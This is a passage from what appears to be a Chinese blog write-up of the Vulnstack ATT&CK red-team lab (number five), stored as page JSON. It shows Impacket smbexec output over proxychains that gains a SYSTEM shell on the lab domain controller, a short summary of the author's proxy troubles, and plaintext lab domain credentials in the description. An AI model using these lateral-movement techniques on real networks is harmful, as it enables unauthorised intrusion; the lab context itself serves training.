class=\"hljs-number\">.138</span><span class=\"hljs-number\">.138</span>\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so<span class=\"hljs-number\">.4</span>\n[proxychains] DLL init: proxychains-ng <span class=\"hljs-number\">4.17</span>\nImpacket v0<span class=\"hljs-number\">.12</span><span class=\"hljs-number\">.0</span> - Copyright Fortra, LLC <span class=\"hljs-keyword\">and</span> its affiliated companies \n\n[proxychains] Strict chain  ...  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">1080</span>  ...  <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.138</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span>  ...  OK\n[*] Requesting shares on <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.138</span><span class=\"hljs-number\">.138</span>.....\n[*] Found writable share ADMIN$\n[*] Uploading file KNuZDebw.exe\n[*] Opening SVCManager on <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.138</span><span class=\"hljs-number\">.138</span>.....\n[*] Creating service efVz on <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.138</span><span class=\"hljs-number\">.138</span>.....\n[*] Starting service efVz.....\n[proxychains] Strict chain  ...  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">1080</span>  ...  <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.138</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span>  ...  OK\n[proxychains] Strict chain  ...  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">1080</span>  ...  <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.138</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span>  ...  OK\n[!] Press <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">for</span> extra shell commands\n[proxychains] Strict chain  ...  <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>:<span class=\"hljs-number\">1080</span>  ...  <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.138</span><span class=\"hljs-number\">.138</span>:<span class=\"hljs-number\">445</span>  ...  OK\n[-] Decoding error detected, consider running chcp.com at the target,\n<span class=\"hljs-built_in\">map</span> the result <span class=\"hljs-keyword\">with</span> https://docs.python.org/<span class=\"hljs-number\">3</span>/library/codecs.html<span class=\"hljs-comment\">#standard-encodings</span>\n<span class=\"hljs-keyword\">and</span> then execute smbexec.py again <span class=\"hljs-keyword\">with</span> -codec <span class=\"hljs-keyword\">and</span> the corresponding codec\nMicrosoft Windows [�汾 <span class=\"hljs-number\">6.1</span><span class=\"hljs-number\">.7600</span>]\n\n[-] Decoding error detected, consider running chcp.com at the target,\n<span class=\"hljs-built_in\">map</span> the result <span class=\"hljs-keyword\">with</span> https://docs.python.org/<span class=\"hljs-number\">3</span>/library/codecs.html<span class=\"hljs-comment\">#standard-encodings</span>\n<span class=\"hljs-keyword\">and</span> then execute smbexec.py again <span class=\"hljs-keyword\">with</span> -codec <span class=\"hljs-keyword\">and</span> the corresponding codec\n��Ȩ���� (c) <span class=\"hljs-number\">2009</span> Microsoft Corporation����������Ȩ����\n\nC:\\Windows\\system32> whoami\nnt authority\\system\n</code></pre>\n<h2>总结</h2>\n<p>其实可以使用<code>CobaltStrike</code> 更方便，但是想试试使用<code>Linux</code>环境来尝试进行域攻击</p>\n<p>还有就是不明白搭建了<code>socks5</code>的代理服务器，使用<code>proxychains4 fscan</code> 以及<code>proxychains4 nmap</code>的操作依旧探测不了主机，<code>nmap</code>我也执行使用<code>-sT</code> 使用<code>TCP</code>来探测，难道是<code>MSF</code>代理的问题吗？</p>\n<p>还有本来想用BloodHound来手机信息，展现更多工具用法，但是…</p>\n<p><img src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%94)/image68.png\" alt=\"image.png\"></p>\n<p>关于域用户<code>admin</code> ，使用<code>CS</code>可以抓取其<code>HASH</code></p>","title":"Vulnstack - ATT&CK红队评估实战靶场(五)","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["Vulnstack","Windows靶机","综合靶场"],"categories":"靶机","description":"ATT&CK红队评估实战靶场(五)\n\nwin7 双网卡模拟内外网 `192.168.138.136` `192.168.183.134`\n\nsun\\leo 123.com\n\nsun\\Administrator dc123.com\n\n2008 `192.168.138.138`\n\nsun\\admin 2021.com\n\nKali `192.168.183.133`\n\n前期踩点\n\n`192.168.1..."}},"__N_SSG":true}